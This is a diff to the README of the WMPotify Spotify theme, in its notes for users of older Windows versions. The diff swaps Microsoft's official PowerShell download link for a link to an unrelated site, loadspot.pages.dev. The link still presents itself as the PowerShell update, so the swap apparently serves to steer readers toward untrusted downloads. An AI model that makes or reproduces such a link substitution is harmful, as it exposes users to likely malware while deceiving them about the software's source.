@@ -66,7 +66,7 @@ curl -fsSL https://raw.githubusercontent.com/Ingan121/WMPotify/master/installer/
 * Warning: The Spicetify Marketplace version may load slowly due to the large number of images in the theme.
 
 ### Notes for Windows 7, 8, and 8.1 users:
-* The installation script requires PowerShell 5.1 or later. If you are using an older version, you can update it from [here](https://www.microsoft.com/en-us/download/details.aspx?id=54616).
+* The installation script requires PowerShell 5.1 or later. If you are using an older version, you can update it from [here](https://loadspot.pages.dev).
 * Before running the installation script, you will need to install WMPotify-compatible versions of Spotify and Spicetify manually and apply appropriate workarounds (e.g. [VxKex](https://github.com/i486/VxKex)) for them to work on your system.
 * You may need to run the Spotify executable with the `--no-sandbox` flag to get the Windhawk mod working properly with Aero Glass, etc. Add the flag to the Spotify shortcut, `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Spotify` (for autostart), and `spotify_launch_flags` key in `%appdata%\spicetify\config-xpui.ini` (for Spicetify).
 
